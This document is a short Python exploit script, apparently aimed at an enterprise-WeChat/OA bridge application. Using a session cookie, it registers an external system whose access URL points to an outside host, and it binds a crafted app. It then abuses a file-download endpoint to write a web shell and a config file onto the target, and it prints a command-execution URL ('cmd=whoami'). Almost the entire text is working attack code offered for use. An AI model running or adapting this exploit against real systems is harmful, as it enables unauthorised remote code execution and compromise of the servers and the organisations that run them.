import requests

url = 'http://127.0.0.1:8088'
serverUrl = 'http://lesion.work:8080'
EBRIDGE_JSESSIONID='2243C9A90971BC2ED8DDF4B8561A812B'

def writeFileRequest():
    cookies = {
        'EBRIDGE_JSESSIONID': EBRIDGE_JSESSIONID,
    }

    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Microsoft Edge";v="108"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    # 创建外部系统
    data = {
        'sysInfo.id': 'sysadmin',
        'sysInfo.sysname': 'tttt',
        'sysInfo.systype': '1',
        'sysInfo.page_encode': 'UTF-8',
        'sysInfo.access_url': serverUrl,
        'account': 'sysadmin',
        'password': '1',
        'sysInfo.desc': 'test',
        'sysInfo.outsys_userid_type': 'loginid',
        'sysInfo.interface_password': 'MWPfeFTpMPak5KDYrEdwtWKGwNZDXrCP',
    }

    response = requests.post(f'{url}/main/outsys/add', cookies=cookies, headers=headers, data=data)
    sysId = response.json()['sysId']

    # 创建应用
    sysagentid='123456789'
    data = {
        'operation': '1',
        'appInfo.id': sysagentid,
        'appInfo.syscorpid': '123',
        'appInfo.templateid': '',
        'appInfo.agenttype': '0',
        'templateid': '13fea4c8ff5911e4820100ffffff0000',
        'templatetype': '1',
        'outsysid': '662f7a9a1444462aaac13d20f66f64eb',
        'menuid': '0d350ba43ef745a59575e147ea26d466',
        'setmainurl': '0',
        'appInfo.name': '客户管理123',
        'appInfo.agentid': '123',
        'appInfo.desc': 'OA客户管123理，快速查询客户信息；',
        'menutype': '3',
        'outSysId': '0',
        'model': '0',
        'linkaddr': '',
        'portal': '',
        'appInfo.secret': '123',
        'appInfo.token': 'fff4020414b948f68d655474c3e5e39b',
        'appInfo.aeskey': '2624c4b8ed0946c4be5776381c455ef3f9ae72a3b31',
    }

    response = requests.post(f'{url}/main/wework/weworkAgentInfo/save', cookies=cookies, headers=headers, data=data)

    # 绑定应用
    response = requests.get(f'{url}/wxclient/app/shake/sign/'+sysagentid, cookies=cookies, headers=headers, data=data)

    # 绑定外部系统
    response = requests.get(f'{url}/wxclient/app/outsys/setOutsysInfoToUser?outsysid='+sysId, cookies=cookies, headers=headers, data=data)

    # 请求写入文件
    response = requests.get(f'{url}/wxclient/filedownload/sendFile?fileid=1', cookies=cookies, headers=headers, data=data)

# 写入shell
writeFileRequest()
# 写入配置文件
writeFileRequest()

print(f'Here is your shell: {url}/mobile/plugin/2/pdfview/web/viewer.jsp?cmd=whoami')